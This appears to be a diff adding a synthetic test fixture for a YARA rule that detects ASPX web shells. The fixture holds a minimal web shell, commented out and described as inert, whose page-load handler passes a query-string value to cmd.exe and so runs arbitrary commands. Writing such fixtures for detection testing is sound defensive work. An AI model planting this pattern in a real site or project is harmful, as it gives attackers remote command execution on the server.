@@ -1,0 +1,12 @@
+Synthetic test fixture (positive) for YARA rule WebShell_ASPX_Process_Start_Request_Input.
+Inert text, never executed. All code is inside an ASP.NET server-side comment and is never compiled.
+
+<%@ Page Language="C#" %>
+<%--
+<script runat="server">
+void Page_Load(object sender, EventArgs e) {
+    var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + Request.QueryString["c"]);
+    System.Diagnostics.Process.Start(psi);
+}
+</script>
+--%>
